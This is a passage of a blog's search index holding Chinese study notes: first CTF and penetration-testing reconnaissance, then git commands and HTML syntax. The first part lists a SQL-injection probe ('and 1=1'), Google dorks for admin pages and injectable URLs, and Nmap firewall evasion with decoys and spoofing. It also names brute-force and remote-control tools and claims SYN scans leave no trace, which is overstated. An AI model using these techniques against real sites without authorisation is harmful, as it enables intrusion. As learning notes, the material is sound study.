href="#测waf" class="headerlink" title="测waf"></a>测waf</h3></li><li>输入and 1=1</li><li>waf会拦截and这一类的参数<h1 id="谷歌hacker"><a href="#谷歌hacker" class="headerlink" title="谷歌hacker"></a>谷歌hacker</h1></li><li>intext:查找网页中含有xx关键字的网站（intext: 管理员登录）</li><li>intitle:查找某个标题（intitle: 后台登录）</li><li>Filetype：查找某个文件类型的文件(数据挖掘 filetype: doc)</li><li>inurl:查找url中带有某字段的网站（inurl: php?id=）</li><li>Site:在某域名中查找信息<h1 id="url采集"><a href="#url采集" class="headerlink" title="url采集"></a>url采集</h1><h1 id="后台查找"><a href="#后台查找" class="headerlink" title="后台查找"></a>后台查找</h1><h2 id="弱口令默认后台"><a href="#弱口令默认后台" class="headerlink" title="弱口令默认后台"></a>弱口令默认后台</h2></li><li>admin,admin/login.asp,manage,login.asp<h2 id="查看网页的链接（超链接）"><a href="#查看网页的链接（超链接）" class="headerlink" title="查看网页的链接（超链接）"></a>查看网页的链接（超链接）</h2></li><li>一般来说，网页的主页有管理登录类似的东西，有些可能被管理员删掉</li><li>选择图片等获取链接，从中截取前半部分关于后台的链接，看看是否能访问<h2 id="查看网站使用的管理系统，从而确定后台"><a href="#查看网站使用的管理系统，从而确定后台" class="headerlink" title="查看网站使用的管理系统，从而确定后台"></a>查看网站使用的管理系统，从而确定后台</h2><h2 id="使用工具查找"><a href="#使用工具查找" class="headerlink" title="使用工具查找"></a>使用工具查找</h2></li><li>御剑</li><li>蜘蛛（菜刀）<h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2></li><li>robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看<h2 id="googlehacker"><a href="#googlehacker" class="headerlink" title="googlehacker"></a>googlehacker</h2><h2 id="短文件利用"><a href="#短文件利用" class="headerlink" title="短文件利用"></a>短文件利用</h2></li><li>如果有administrator121321312.asp,那么可以直接输入/a<del>!.asp(开头char加</del>加！加文件类型)<h1 id="CDN绕过方法（信息收集上最后）"><a href="#CDN绕过方法（信息收集上最后）" class="headerlink" title="CDN绕过方法（信息收集上最后）"></a>CDN绕过方法（信息收集上最后）</h1><h2 id="什么是CDN"><a href="#什么是CDN" class="headerlink" title="什么是CDN"></a>什么是CDN</h2></li><li>内容分发网络（访问加速）</li></ol><h1 id="信息收集下"><a href="#信息收集下" class="headerlink" title="信息收集下"></a>信息收集下</h1><h2 id="操作方向"><a href="#操作方向" class="headerlink" title="操作方向"></a>操作方向</h2><ol><li>域名信息</li><li>whois信息</li><li>目录信息</li><li>谷歌hacker</li><li>整站分析</li><li>旁站c端</li><li>后台查找</li><li>cdn绕过</li><li>app</li><li>host.txt</li></ol><h2 id="自动跑漏洞工具"><a href="#自动跑漏洞工具" class="headerlink" title="自动跑漏洞工具"></a>自动跑漏洞工具</h2><h3 id="Nmap端口扫描王"><a href="#Nmap端口扫描王" class="headerlink" title="Nmap端口扫描王"></a>Nmap端口扫描王</h3><h4 id="主机探测（看哪些主机IP在线）（up-down）"><a href="#主机探测（看哪些主机IP在线）（up-down）" class="headerlink" title="主机探测（看哪些主机IP在线）（up/down）"></a>主机探测（看哪些主机IP在线）（up/down）</h4><p>（以下步骤的前提是切换到nmap的目录下能够找到nmap.exe）</p><ol><li>扫描单个主机 nmap.exe 192.168.1.2</li><li>扫描整个子网 nmap.exe 192.168.1.1/24</li><li>扫描多个目标 nmap.exe IP1 IP2</li><li>扫描一个范围内的目标 nmap.exe 192.168.1.1-100(扫描1到100的所有主机)</li></ol><h4 id="查看扫描的所有主机的列表（加参数-sL）"><a href="#查看扫描的所有主机的列表（加参数-sL）" class="headerlink" title="查看扫描的所有主机的列表（加参数-sL）"></a>查看扫描的所有主机的列表（加参数-sL）</h4><ol><li>nmap -sL 192.168.1.1/24</li></ol><h4 id="扫描除过某一个IP外的所有子网主机"><a href="#扫描除过某一个IP外的所有子网主机" class="headerlink" title="扫描除过某一个IP外的所有子网主机"></a>扫描除过某一个IP外的所有子网主机</h4><ol><li>nmapxxx-excludexx****</li><li>include和exclude</li></ol><h4 id="扫描除过某一个文件中的IP外的子网主机命令"><a href="#扫描除过某一个文件中的IP外的子网主机命令" class="headerlink" title="扫描除过某一个文件中的IP外的子网主机命令"></a>扫描除过某一个文件中的IP外的子网主机命令</h4><ol><li>nmapxxx-excludefilexxx.txt(会先读取xxx.file中的IP，然后排除)</li></ol><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ol><li>nmap -F -sT -v IP</li><li>-F:扫描100个最有可能开放的端口</li><li>-v 获取扫描的信息</li><li>-sT:采用的是TCP扫描，不写也可，默认为TCP扫描</li><li>-p指定扫描的端口</li></ol><h3 id="zenmap是可视化界面"><a href="#zenmap是可视化界面" class="headerlink" title="zenmap是可视化界面"></a>zenmap是可视化界面</h3><ol><li>可以直接输入域名进行扫描</li></ol><h2 id="端口扫描状态"><a href="#端口扫描状态" class="headerlink" title="端口扫描状态"></a>端口扫描状态</h2><ol><li>open 端口开启，数据有到达主机，有程序在端口上监控</li><li>closed 端口关闭，数据有到达主机，没有程序在端口上监控</li><li>filtered 数据没有到达主机，返回的结果为空，数据被防火墙或者是IDS过滤</li><li>unfiltered 数据有到达主机，但是不能识别端口的当前状态</li><li><img src="D:\CTF学习工具\QQ截图.png"></li></ol><h2 id="服务版本扫描"><a href="#服务版本扫描" class="headerlink" title="服务版本扫描"></a>服务版本扫描</h2><h2 id="主机系统的指纹识别"><a href="#主机系统的指纹识别" class="headerlink" title="主机系统的指纹识别"></a>主机系统的指纹识别</h2><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><h2 id="创建扫描版本"><a href="#创建扫描版本" class="headerlink" title="创建扫描版本"></a>创建扫描版本</h2><h2 id="burpsuite手工测"><a href="#burpsuite手工测" class="headerlink" title="burpsuite手工测"></a>burpsuite手工测</h2><h2 id="TCP扫描三次握手-sT-s表明扫描方式，T表明是TCP"><a href="#TCP扫描三次握手-sT-s表明扫描方式，T表明是TCP" class="headerlink" title="TCP扫描三次握手 -sT(s表明扫描方式，T表明是TCP)"></a>TCP扫描三次握手 -sT(s表明扫描方式，T表明是TCP)</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li>客户端向服务端发送请求</li><li>服务端向客户端发送响应包</li><li>客户端向服务端发送确认相应包</li><li>如果客户端已知不发送，服务端会等待（看服务端的设置状态，例如：等待n秒）</li></ol><h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><ol><li>当黑客手里握着的主机同时向服务端发送请求时，如果超过服务器能够承受的量，且黑客一直在第三次握手的时候不发送确认包，则会令服务端一直等待，严重的导致拒绝服务</li></ol><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol><li>扫描速度快，准确性高，对操作者没有权限上的要求</li><li>但是容易被防火墙和IDS防入侵系统发现</li></ol><h2 id="SYN扫描-sS（s表明扫描方式-S表明SYN扫描）"><a href="#SYN扫描-sS（s表明扫描方式-S表明SYN扫描）" class="headerlink" title="SYN扫描 -sS（s表明扫描方式,S表明SYN扫描）"></a>SYN扫描 -sS（s表明扫描方式,S表明SYN扫描）</h2><ol><li>秘密的扫描方式</li><li>Client和Server之间没有形成三次握手，所以没有简历一个正常的TCP链接</li><li>不会被防火墙和日志所记录，一般不会在目标主机上留下任何痕迹，但是这种扫描需要root权限</li></ol><h2 id="使用UDP-ping探测主机"><a href="#使用UDP-ping探测主机" class="headerlink" title="使用UDP ping探测主机"></a>使用UDP ping探测主机</h2><p>nmap -PU xxx</p><h2 id="服务器版本探测"><a href="#服务器版本探测" class="headerlink" title="服务器版本探测"></a>服务器版本探测</h2><p>nmap -sV xxx</p><ol><li>服务器版本即服务器系统的版本</li></ol><h2 id="精确地确认端口上运行的服务"><a href="#精确地确认端口上运行的服务" class="headerlink" title="精确地确认端口上运行的服务"></a>精确地确认端口上运行的服务</h2><p>nmap -sV –script unusual-port xxx</p><h2 id="探测目标主机的操作系统"><a href="#探测目标主机的操作系统" class="headerlink" title="探测目标主机的操作系统"></a>探测目标主机的操作系统</h2><ol><li>nmap -O xxx</li><li>nmap -A xxx</li><li>-oN 导出扫描结果</li><li>-oX 导出扫描结果xml格式  </li><li>nmap -A xxx -oX c:\123.xml</li></ol><h2 id="防火墙躲避绕过"><a href="#防火墙躲避绕过" class="headerlink" title="防火墙躲避绕过"></a>防火墙躲避绕过</h2><ol><li>-f 分片绕过</li><li>-D 使用诱饵隐蔽扫描： nmap -D 1.1.1.1,222.222.222.222 xxx</li><li>–source-port 源端口欺骗</li></ol><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ol><li>syn扫描器</li><li>扫描外围主机网段</li><li>对应端口爆破工具</li><li>提供访问木马服务器下载的工具</li><li>一个远控</li></ol>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
          <category> 定义 </category>
          
          <category> IP </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 定义 </tag>
            
            <tag> IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git</title>
      <link href="/git/"/>
      <url>/git/</url>
      
        <content type="html"><![CDATA[<h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><h2 id="将历史版本代码用树的形式来整合利用"><a href="#将历史版本代码用树的形式来整合利用" class="headerlink" title="将历史版本代码用树的形式来整合利用"></a>将历史版本代码用树的形式来整合利用</h2><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ol><li><p>工作区：仓库的目录</p></li><li><p>暂存区：数据暂时存放的区域，类似于工作区写入版本库前的缓存区，暂存区是独立于各个分支的</p></li><li><p>版本库：存放所有已经提交到本地仓库的代码版本</p></li><li><p>版本结构：树结构，树中每个节点代表一个代码版本</p><h2 id="git命令"><a href="#git命令" class="headerlink" title="git命令"></a>git命令</h2></li><li><p>git config –global user.name xxx:设置全局用户名，信息将记录在~/.gitconfig文件中</p></li><li><p>git config –global user.email <a href="mailto:&#120;&#120;&#x78;&#x40;&#x78;&#x78;&#x78;&#x2e;&#x63;&#x6f;&#109;">&#120;&#120;&#x78;&#x40;&#x78;&#x78;&#x78;&#x2e;&#x63;&#x6f;&#109;</a>:设置全局邮箱地址，信息将记录在~/.gitconfig文件中</p></li><li><p>git init：将当前目录配置成git仓库，信息将记录在隐藏的.git文件夹中</p></li><li><p>git add xxx:将xxx文件添加到暂存区</p></li><li><p>git add .:将所有待加入暂存区的文件加入暂存区</p></li><li><p>git rm –catched xx:将文件从仓库索引目录中删掉</p></li><li><p>git log :查看xx当前分支中的所有版本 </p></li><li><p>git reflog : 查看HEAD指针的移动历史</p></li><li><p>git reset –hard HEAD^或git reset –hard HEAD~：将代码库回滚到上个版本</p></li><li><p>git reset –hard HEAD^^回滚两次，以此类推</p></li><li><p>git reset –hard HEAD~num:回滚num次</p></li><li><p>git reset –hard 版本号：回滚到某一特定版本</p></li><li><p>git checkout - XX 或 git restore XX :将XX文件尚未加入暂存区的修改全部撤销</p></li><li><p>git remote add origin <a href="mailto:&#x67;&#105;&#116;&#64;&#103;&#105;&#x74;&#46;&#x61;&#x63;&#x77;&#x69;&#110;&#x67;&#x2e;&#99;&#111;&#109;">&#x67;&#105;&#116;&#64;&#103;&#105;&#x74;&#46;&#x61;&#x63;&#x77;&#x69;&#110;&#x67;&#x2e;&#99;&#111;&#109;</a>:…将本地仓库关联到远程仓库</p></li><li><p>git push -u:将当前分支推送到远程仓库（第一次需要0u，以后不需要）</p></li><li><p>git push origin branch_name:将本地的某个分支推送到远程仓库</p></li><li><p>git clone <a href="mailto:&#x67;&#x69;&#116;&#x40;&#x67;&#x69;&#x74;&#46;&#x61;&#x63;&#119;&#x69;&#x6e;&#103;&#46;&#99;&#x6f;&#109;">&#x67;&#x69;&#116;&#x40;&#x67;&#x69;&#x74;&#46;&#x61;&#x63;&#119;&#x69;&#x6e;&#103;&#46;&#99;&#x6f;&#109;</a>:…将远程仓库xxx下载到当前目录下</p></li><li></li></ol><h1 id="节点只负责存储版本，注意区分暂存区和工作区"><a href="#节点只负责存储版本，注意区分暂存区和工作区" class="headerlink" title="节点只负责存储版本，注意区分暂存区和工作区"></a>节点只负责存储版本，注意区分暂存区和工作区</h1><ol><li>git restore xxx:将工作区的文件回滚到暂存区版本</li><li>git restore –staged xxx:将暂存区的版本回滚到库中版本</li></ol><h1 id="git的第二次学习"><a href="#git的第二次学习" class="headerlink" title="git的第二次学习"></a>git的第二次学习</h1><h2 id="git的作用"><a href="#git的作用" class="headerlink" title="git的作用"></a>git的作用</h2><ol><li>  <strong>存档</strong>，commit，提交一个新的版本，可以通过git回滚到之前的版本</li><li>  如果自己电脑和服务器的代码不同，则git可以用来<strong>同步不同机器上的代码</strong></li></ol><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><ol><li>  创建文件夹</li><li>  git init</li><li>  写一个readme.md</li><li>  git status</li><li>  git add . 将当前目录下的所有未收录的文件收录到仓库中</li><li>  git status 再次查看git的状态</li><li>  git commit -m “创建项目”</li><li>  查看github或者gitlab,看看键入的相关信息</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220829165623.png"></li><li>  去掉–global，否则所有项目都是一个配置 </li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220829185301.png"></li></ol><h2 id="后期使用"><a href="#后期使用" class="headerlink" title="后期使用"></a>后期使用</h2><h3 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h3><ol><li>  在目录下写完东西</li><li>  git status</li><li>  git add .</li><li>  git commit -m “这一个版本的名字”</li><li>  git push</li><li>  最后的push不能忘记，因为如果没有push，则不会传到仓库中</li></ol><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><ol><li>  删除和添加的操作相同</li><li>  git status查看现在git的状态</li><li>  git add .</li><li>  git commit -m “xxx”</li><li>  git push</li></ol><h3 id="将仓库中的代码同步到自己的本子上"><a href="#将仓库中的代码同步到自己的本子上" class="headerlink" title="将仓库中的代码同步到自己的本子上"></a>将仓库中的代码同步到自己的本子上</h3><pre class="line-numbers language-none"><code class="language-none">git pull<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看所有版本的代码"><a href="#查看所有版本的代码" class="headerlink" title="查看所有版本的代码"></a>查看所有版本的代码</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220829193640.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220829193723.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML语法规范</title>
      <link href="/HTML%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/"/>
      <url>/HTML%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<mark class="hl-label info">info</mark> <h2 id="XHTML的出现是为了过渡到xml"><a href="#XHTML的出现是为了过渡到xml" class="headerlink" title="XHTML的出现是为了过渡到xml"></a>XHTML的出现是为了过渡到xml</h2><h2 id="HTML中不区分大小写，但是我们一般都使用小写"><a href="#HTML中不区分大小写，但是我们一般都使用小写" class="headerlink" title="HTML中不区分大小写，但是我们一般都使用小写"></a>HTML中不区分大小写，但是我们一般都使用小写</h2><h2 id="HTML的注释不能嵌套（就和c-中的if-else一样）"><a href="#HTML的注释不能嵌套（就和c-中的if-else一样）" class="headerlink" title="HTML的注释不能嵌套（就和c++中的if-else一样）"></a>HTML的注释不能嵌套（就和c++中的if-else一样）</h2><h2 id="HTML标签必须结构完整，要么成对出现，要么自结束标签"><a href="#HTML标签必须结构完整，要么成对出现，要么自结束标签" class="headerlink" title="HTML标签必须结构完整，要么成对出现，要么自结束标签"></a>HTML标签必须结构完整，要么成对出现，要么自结束标签</h2><ol><li><p>浏览器会尽最大努力正确解析页面，不符合语法规范的内容，浏览器会自动修正</p></li><li><p>但是有些情况会修正错误</p><h1 id="F12会跳出开发者控制台"><a href="#F12会跳出开发者控制台" class="headerlink" title="F12会跳出开发者控制台"></a>F12会跳出开发者控制台</h1><h2 id="自结束标签："><a href="#自结束标签：" class="headerlink" title="自结束标签："></a>自结束标签：</h2></li><li><p>html5中&lt; br &gt;</p></li><li><p>xhtml中&lt; br /&gt;(最后有反斜杠)</p><h2 id="HTML标签可以嵌套，但是不能交叉嵌套"><a href="#HTML标签可以嵌套，但是不能交叉嵌套" class="headerlink" title="HTML标签可以嵌套，但是不能交叉嵌套"></a>HTML标签可以嵌套，但是不能交叉嵌套</h2><h2 id="HTML标签中的属性必须有值，且值必须加引号"><a href="#HTML标签中的属性必须有值，且值必须加引号" class="headerlink" title="HTML标签中的属性必须有值，且值必须加引号"></a>HTML标签中的属性必须有值，且值必须加引号</h2></li><li><p>&lt; font color=”red” &gt;</p></li><li><p>单双引号均可</p></li></ol><h1 id="live-server快捷键"><a href="#live-server快捷键" class="headerlink" title="live-server快捷键"></a>live-server快捷键</h1><ol><li>写标签的名字后按tab键补全</li><li>写开始标签，回车自动补全</li><li>ctrl+/，自动生成注释标签</li></ol><h1 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h1><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><ol><li>HTML中元素指的是从开始标签到结束标签的所有代码，或者开放标签和闭合标签</li></ol><h1 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h1><ol><li>在网页中，编写的多个空格，会被浏览器自动解析为一个空格</li><li>在html中我们不能直接书写一些特殊符号，比如连续多个空格，比如字母两侧的大于和小于号</li><li>如果我们需要在网页中书写这些符号，需要使用html中的实体（转义字符）</li><li>实体的语法<pre class="line-numbers language-none"><code class="language-none">&amp;实体的名字;    &amp;nbsp;空格    &gt;大于号    &lt;小于号    &amp;copy;版权符号&amp;开头;结尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h1><pre class="line-numbers language-none"><code class="language-none">定义：the html &lt;meta&gt; represents metadata that cannot be represented by other html meta related elements,like &lt;base&gt;,&lt;link&gt;,&lt;script&gt;,&lt;style&gt;,&lt;title&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="可以提供页面元信息"><a href="#可以提供页面元信息" class="headerlink" title="可以提供页面元信息"></a>可以提供页面元信息</h2><pre class="line-numbers language-none"><code class="language-none">元信息是指描述自身的信息，元信息类标签是指html中用于描述文档自身的一类标签通常出现在head标签中，提供给浏览器或者搜索引擎阅读的，一般不会显示给用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="meta标签永远位于head元素内部"><a href="#meta标签永远位于head元素内部" class="headerlink" title="meta标签永远位于head元素内部"></a>meta标签永远位于head元素内部</h2><h2 id="属性："><a href="#属性：" class="headerlink" title="属性："></a>属性：</h2><pre class="line-numbers language-none"><code class="language-none">content指定的数据内容    charset: 指定网页的字符集    name: 指定数据的名称    content： 指定数据的内容    keywords: 表示网站的关键字    description: 用于指定网站的描述,显示在搜索引擎中的搜索结果中title标签的内容会作为搜索结果的超链接上的文字显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/11/ZpA93mTEXU82Yr4.png"></p><h3 id="必须"><a href="#必须" class="headerlink" title="必须"></a>必须</h3><ol><li>content:定义与http-equiv或name属性相关的元信息（使用，进行分割）<h3 id="可选："><a href="#可选：" class="headerlink" title="可选："></a>可选：</h3></li><li>http-equiv:把content属性关联到HTTP头部</li><li>name:把content属性关联到一个名称– name和content是一对关键字</li><li>scheme:定义用于翻译content属性值的格式</li><li>description:<img src="https://s2.loli.net/2022/05/11/QjIFcrkgbGBCHPO.png"></li></ol><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><ol><li>keywords:为文档定义了一组关键字，某些搜索引擎在遇到这些关键字时会用这些关键字对文档进行分类。&lt; meta name=”keywords” content=”HTML,ASP,PHP” /&gt;(会将HTML等内容进行转keywords操作，content内容使用,进行分割)</li></ol><h3 id="http-equiv"><a href="#http-equiv" class="headerlink" title="http-equiv"></a>http-equiv</h3><pre class="line-numbers language-none"><code class="language-none">用来设置http协议，将一个页面重定向到另一个网站，<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>为名称/值对提供了名称，并指示服务器在发送实际的文档之前先要传送给浏览器的MIME文档头部包含名称值对。</li><li>当服务器向浏览器发送文档时，会先发送许多名称/值对，但是所有的服务器都至少要发送一个。</li><li>使用带有http-equiv属性的meta标签时，服务器将把名称/值对添加到发送给浏览器的内容头部</li><li>&lt; meta http-equiv=”charset” content=”iso-8859-1”&gt;</li><li><img src="https://s2.loli.net/2022/05/11/QNcIihLlHoBgq2U.png"></li><li>其中3表示时间，url表示往哪跳转，重定向到哪.之间用什么间隔</li></ol><h3 id="content"><a href="#content" class="headerlink" title="content"></a>content</h3><ol><li>提供了名称/值对中的值，该值可以是任何有效的字符串</li><li>content属性始终要和name属性或http-equiv属性一起使用<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2></li><li>&lt; meta http-equiv=”Refresh” content=”间隔时间；url=跳转页面的url”&gt;</li></ol><h1 id="常用的标签："><a href="#常用的标签：" class="headerlink" title="常用的标签："></a>常用的标签：</h1><h2 id="二者之间的关系"><a href="#二者之间的关系" class="headerlink" title="二者之间的关系"></a>二者之间的关系</h2><ol><li>一般情况下会在块元素中放行内元素</li><li>而不会在行内元素中放块元素</li><li>块元素中一般什么都能放</li><li>但是尤其注意：p元素中不能放任何的块元素<br><img src="https://s2.loli.net/2022/05/12/QuWLGEeUR6FXwmc.png"><br><img src="https://s2.loli.net/2022/05/12/HaYZM1bfSoLrFQJ.png"></li></ol><h2 id="在页面中独占一行的元素称为块元素block-element"><a href="#在页面中独占一行的元素称为块元素block-element" class="headerlink" title="在页面中独占一行的元素称为块元素block element"></a>在页面中独占一行的元素称为块元素block element</h2><ol><li>在页面中一般通过块元素来对页面进行宏观布局</li><li><img src="https://s2.loli.net/2022/05/12/96Cd5z1Z2fqwMFv.png"><h3 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h3></li><li>HTML中一共有六级标签：h1~h6</li><li>h1最大，为一级；h6为最小，为6级</li><li>一般不用，主要是css来修改</li><li>使用HTML标签时，关心的是标签的语义，我们使用的标签都是语义化标签</li><li>6级标签中，h1最重要，表示一个网页中的主要内容，h2~h6的重要性一次降低</li><li>搜索引擎先搜素title标签，然后就会搜索标题标签，从h1到h6</li></ol><h4 id="对于搜索引擎来说，h1的重要性仅次于title-搜索引擎检索完title，会立即查看h1中的内容"><a href="#对于搜索引擎来说，h1的重要性仅次于title-搜索引擎检索完title，会立即查看h1中的内容" class="headerlink" title="对于搜索引擎来说，h1的重要性仅次于title,搜索引擎检索完title，会立即查看h1中的内容"></a>对于搜索引擎来说，h1的重要性仅次于title,搜索引擎检索完title，会立即查看h1中的内容</h4><ol><li>h1标签非常重要，会影响页面再搜索引擎中的排名，页面只能写一个h1</li><li>一般页面标题中只使用h1,h2,h3，h3以后的基本不使用<br><img src="https://s2.loli.net/2022/05/11/evhY6jZuxoz3qRH.png"></li></ol><h4 id="lt-hgroup-gt"><a href="#lt-hgroup-gt" class="headerlink" title="&lt; hgroup&gt;"></a>&lt; hgroup&gt;</h4><ol><li>hgroup用来为标题分组，可以将一组相关的标题同时放入到hgroup</li><li>分组的目的是用css单独控制这个组，方便修改样式</li></ol><p><img src="https://s2.loli.net/2022/05/11/Qndbqt1LljZuIz7.png"></p><pre class="line-numbers language-none"><code class="language-none">&lt;hgroup&gt;    &lt;h1&gt;...&lt;&#x2F;h1&gt;    &lt;h2&gt;...&lt;&#x2F;h2&gt;&lt;&#x2F;hgroup&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="lt-header-gt-标签"><a href="#lt-header-gt-标签" class="headerlink" title="&lt; header&gt;标签"></a>&lt; header&gt;标签</h4><ol><li>&lt; header&gt;&lt;/ header&gt;<br><img src="https://s2.loli.net/2022/05/13/A3rjc1Gludx48Q7.png"></li><li>定义网页的头部</li><li>可以是网页的某一个部分的头部，所以header标签可以不只有一个</li></ol><h4 id="lt-main-gt"><a href="#lt-main-gt" class="headerlink" title="&lt; main&gt;"></a>&lt; main&gt;</h4><ol><li>网页的主体部分</li><li>和c++main函数一样，一个页面中只能有一个</li></ol><h4 id="lt-footer-gt"><a href="#lt-footer-gt" class="headerlink" title="&lt; footer&gt;"></a>&lt; footer&gt;</h4><ol><li>网页的底部<br><img src="https://s2.loli.net/2022/05/13/9qymkQrbfwnPjig.png"></li><li>可以是网页的某一个部分的底部，所以footer标签不只有一个</li></ol><h4 id="lt-nav-gt"><a href="#lt-nav-gt" class="headerlink" title="&lt; nav&gt;"></a>&lt; nav&gt;</h4><ol><li>表示网页的导航</li><li><img src="https://s2.loli.net/2022/05/13/GAeNYhfSF3ksCgH.png"></li><li><img src="https://s2.loli.net/2022/05/14/3yTkS2FtmL5HfAN.png"></li><li>&lt; nav&gt;标签里面放&lt; a&gt;(超链接)<pre class="line-numbers language-none"><code class="language-none">&lt;nav&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt;&lt;nav&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="lt-aside-gt"><a href="#lt-aside-gt" class="headerlink" title="&lt; aside&gt;"></a>&lt; aside&gt;</h4><ol><li>和主体相关又不属于主体</li><li>对文章中的某一个字或词在旁边进行图解注释<br><img src="https://s2.loli.net/2022/05/13/gKvtkwVUAzMqjPo.png"></li></ol><h4 id="lt-article-gt"><a href="#lt-article-gt" class="headerlink" title="&lt; article&gt;"></a>&lt; article&gt;</h4><ol><li>表示一个独立的文章</li><li>每一个独立的&lt; article&gt;都可以插入小的&lt; article&gt;</li></ol><h4 id="lt-section-gt"><a href="#lt-section-gt" class="headerlink" title="&lt; section&gt;"></a>&lt; section&gt;</h4><ol><li>表示一个独立的区块(其它)</li><li>上面的标签都不能表示时，使用section</li><li>例如header里面放三个section<br><img src="https://s2.loli.net/2022/05/13/87bqE6IzhRxBsrp.png"></li></ol><h4 id="lt-div-gt"><a href="#lt-div-gt" class="headerlink" title="&lt; div&gt;"></a>&lt; div&gt;</h4><ol><li>没有语义，就是用来表示一个区块</li><li>上面的&lt; hgroup&gt;,&lt; header&gt;,&lt; aside&gt;,&lt; article&gt;,&lt; section&gt;,&lt; nav&gt;都可以用div来代替</li></ol><h3 id="段落标签"><a href="#段落标签" class="headerlink" title="段落标签"></a>段落标签</h3><ol><li>用于表示内容中的一个自然段，使用p标签来表示一个段落</li><li>&lt; p&gt;中间放段落&lt; /p&gt;</li><li>p标签中的文字，默认会独占一行，并且段和段之间会有一个间</li><li>但是如果没有p标签则会出现在一行，并且行与行之间没有间距</li></ol><h3 id="lt-br-gt"><a href="#lt-br-gt" class="headerlink" title="&lt; br&gt;"></a>&lt; br&gt;</h3><ol><li>在页面中也可以使用br标签来表示一个换行，br标签是一个自结束标签<br /></li></ol><h3 id="lt-hr-gt"><a href="#lt-hr-gt" class="headerlink" title="&lt; hr&gt;"></a>&lt; hr&gt;</h3><ol><li>&lt; hr /&gt;，hr标签也是一个自结束标签，可以在页面中生成一条水平线</li></ol><h1 id="在页面中不会独占一行的元素称为行内元素（inline-element"><a href="#在页面中不会独占一行的元素称为行内元素（inline-element" class="headerlink" title="在页面中不会独占一行的元素称为行内元素（inline element)"></a>在页面中不会独占一行的元素称为行内元素（inline element)</h1><ol><li>和布局无关</li><li>主要用来包裹文字</li></ol><h2 id="lt-em-gt-加重语气标签"><a href="#lt-em-gt-加重语气标签" class="headerlink" title="&lt; em&gt;加重语气标签"></a>&lt; em&gt;加重语气标签</h2><ol><li>样式会和其它的没有em的字体不同，可能会斜体，突出</li><li>没有换行</li><li>只是语气的加重</li></ol><h2 id="lt-strong-gt"><a href="#lt-strong-gt" class="headerlink" title="&lt; strong&gt;"></a>&lt; strong&gt;</h2><ol><li>表示强调，重要内容</li><li>是整体的强调作用</li></ol><h2 id="lt-q-gt"><a href="#lt-q-gt" class="headerlink" title="&lt; q&gt;"></a>&lt; q&gt;</h2><ol><li>表示引用</li><li>短引用</li><li>会有引号，但是不会缩进</li></ol><h2 id="lt-blockquote-gt"><a href="#lt-blockquote-gt" class="headerlink" title="&lt; blockquote&gt;"></a>&lt; blockquote&gt;</h2><ol><li>块引用(长引用)</li><li>会缩进，没有引号</li></ol><h2 id="lt-span-gt"><a href="#lt-span-gt" class="headerlink" title="&lt; span&gt;"></a>&lt; span&gt;</h2><ol><li>行内元素，没有任何的语义，一般用于在网页中选中文字</li></ol><h1 id="浏览器的自动修正"><a href="#浏览器的自动修正" class="headerlink" title="浏览器的自动修正"></a>浏览器的自动修正</h1><ol><li>浏览器在解析网页时，会对网页中不符合规范的内容进行修正</li><li>比如标签写在了根&lt; 